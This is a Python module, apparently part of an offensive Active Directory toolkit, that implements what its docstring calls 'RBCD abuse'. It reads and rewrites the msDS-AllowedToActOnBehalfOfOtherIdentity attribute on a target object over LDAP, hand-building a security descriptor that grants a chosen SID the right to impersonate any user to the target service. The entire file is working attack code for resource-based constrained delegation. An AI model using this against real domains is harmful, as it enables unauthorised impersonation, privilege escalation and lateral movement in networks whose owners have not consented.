"""RBCD (Resource-Based Constrained Delegation) abuse.

Reads and writes msDS-AllowedToActOnBehalfOfOtherIdentity on a target object.
The attribute contains a mini security descriptor (just a DACL) whose ALLOW
ACEs define which principals can impersonate any user to the target service.
"""

from __future__ import annotations

import logging
import struct

log = logging.getLogger(__name__)

# ACCESS_ALLOWED_ACE_TYPE / GenericAll on service ticket-granting
_RBCD_MASK = 0x000F01FF  # SERVICE_ACCESS | standard rights (matches AD-style write)


def get_rbcd(conn, target_dn: str) -> list[str]:
    """Return the SIDs currently allowed to delegate to target_dn.

    Returns a list of SID strings from the DACL of
    msDS-AllowedToActOnBehalfOfOtherIdentity.
    """
    entries = conn.ldap_search(
        "(objectClass=*)",
        attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity", "sAMAccountName"],
        base=target_dn,
        scope="BASE",
    )
    if not entries:
        return []

    from maul.core.ldap_client import get_attr_first
    raw = get_attr_first(entries[0], "msDS-AllowedToActOnBehalfOfOtherIdentity")
    if not raw:
        return []

    sd_bytes = raw if isinstance(raw, bytes) else raw.encode("latin-1")
    return _parse_rbcd_sids(sd_bytes)


def set_rbcd(conn, target_dn: str, allowed_sid: str) -> None:
    """Add allowed_sid to the RBCD delegation list on target_dn.

    Reads the existing attribute, adds the SID if not already present,
    and writes the updated SD back.
    """
    existing = _read_raw_sd(conn, target_dn)
    if existing:
        sd_bytes = _add_sid_to_sd(existing, allowed_sid)
    else:
        sd_bytes = _build_rbcd_sd([allowed_sid])

    _write_rbcd(conn, target_dn, sd_bytes)
    log.info("RBCD: added %s → %s", allowed_sid, target_dn)


def remove_rbcd(conn, target_dn: str) -> None:
    """Clear msDS-AllowedToActOnBehalfOfOtherIdentity on target_dn entirely."""
    _write_rbcd(conn, target_dn, None)
    log.info("RBCD: cleared on %s", target_dn)


def remove_sid_from_rbcd(conn, target_dn: str, remove_sid: str) -> None:
    """Remove a specific SID from the RBCD delegation list."""
    existing = _read_raw_sd(conn, target_dn)
    if not existing:
        return
    sd_bytes = _remove_sid_from_sd(existing, remove_sid)
    if sd_bytes:
        _write_rbcd(conn, target_dn, sd_bytes)
    else:
        remove_rbcd(conn, target_dn)  # no ACEs left — clear the attribute


# ── SD construction ───────────────────────────────────────────────────────────

def _build_rbcd_sd(sids: list[str]) -> bytes:
    """Build a minimal self-relative security descriptor for RBCD."""
    from impacket.ldap.ldaptypes import ACCESS_ALLOWED_ACE, ACCESS_MASK, LDAP_SID
    import struct

    # Build raw ACE bytes for each SID
    ace_bytes_list: list[bytes] = []
    for sid_str in sids:
        ace_inner = ACCESS_ALLOWED_ACE()
        ace_inner.fields["Mask"] = ACCESS_MASK()
        ace_inner.fields["Mask"]["Mask"] = _RBCD_MASK
        ace_inner.fields["Sid"] = LDAP_SID()
        ace_inner.fields["Sid"].fromCanonical(sid_str)
        inner_data = ace_inner.getData()
        # Prepend ACE header: AceType(1) AceFlags(1) AceSize(2)
        ace_size = 4 + len(inner_data)
        header = struct.pack("<BBH", 0x00, 0x00, ace_size)
        ace_bytes_list.append(header + inner_data)

    # Build DACL
    all_aces = b"".join(ace_bytes_list)
    acl_size = 8 + len(all_aces)
    dacl = struct.pack("<BBHHH", 2, 0, acl_size, len(sids), 0) + all_aces

    # Owner/group = SYSTEM
    owner_sid = LDAP_SID()
    owner_sid.fromCanonical("S-1-5-18")
    owner_bytes = owner_sid.getData()
    group_bytes = owner_bytes

    # Self-relative SD header (20 bytes)
    owner_off = 20
    group_off = owner_off + len(owner_bytes)
    dacl_off  = group_off + len(group_bytes)
    control   = 0x8004  # SE_SELF_RELATIVE | SE_DACL_PRESENT

    sd_header = struct.pack("<BBH4I", 1, 0, control, owner_off, group_off, 0, dacl_off)
    return sd_header + owner_bytes + group_bytes + dacl


def _parse_rbcd_sids(sd_bytes: bytes) -> list[str]:
    """Parse SIDs from the DACL of an RBCD security descriptor."""
    try:
        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
        sd = SR_SECURITY_DESCRIPTOR()
        sd.fromString(sd_bytes)
        sids: list[str] = []
        try:
            for ace in sd["Dacl"]["Data"]:
                try:
                    sids.append(ace["Ace"]["Sid"].formatCanonical())
                except Exception:
                    pass
        except Exception:
            pass
        return sids
    except Exception as exc:
        log.debug("Failed to parse RBCD SD: %s", exc)
        return []


def _add_sid_to_sd(sd_bytes: bytes, new_sid: str) -> bytes:
    """Add a SID to the DACL of an existing SD, returning the updated SD bytes."""
    existing_sids = _parse_rbcd_sids(sd_bytes)
    if new_sid in existing_sids:
        return sd_bytes  # already present
    return _build_rbcd_sd(existing_sids + [new_sid])


def _remove_sid_from_sd(sd_bytes: bytes, remove_sid: str) -> bytes | None:
    existing_sids = _parse_rbcd_sids(sd_bytes)
    remaining = [s for s in existing_sids if s != remove_sid]
    if not remaining:
        return None
    return _build_rbcd_sd(remaining)


# ── LDAP write helpers ────────────────────────────────────────────────────────

def _read_raw_sd(conn, target_dn: str) -> bytes | None:
    from maul.core.ldap_client import get_attr_first
    entries = conn.ldap_search(
        "(objectClass=*)",
        attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity"],
        base=target_dn,
        scope="BASE",
    )
    if not entries:
        return None
    raw = get_attr_first(entries[0], "msDS-AllowedToActOnBehalfOfOtherIdentity")
    if raw is None:
        return None
    return raw if isinstance(raw, bytes) else raw.encode("latin-1")


def _write_rbcd(conn, target_dn: str, sd_bytes: bytes | None) -> None:
    """Write (or clear) msDS-AllowedToActOnBehalfOfOtherIdentity via LDAP modify."""
    import ldap3

    conn._ensure_connected()
    ldap_conn = conn._ldap_conn

    if sd_bytes is None:
        changes = {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(ldap3.MODIFY_DELETE, [])]}
    else:
        changes = {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(ldap3.MODIFY_REPLACE, [sd_bytes])]}

    result = ldap_conn.modify(target_dn, changes)
    if not result:
        raise RuntimeError(
            f"LDAP modify failed for {target_dn}: "
            f"{ldap_conn.result.get('description', 'unknown')}"
        )
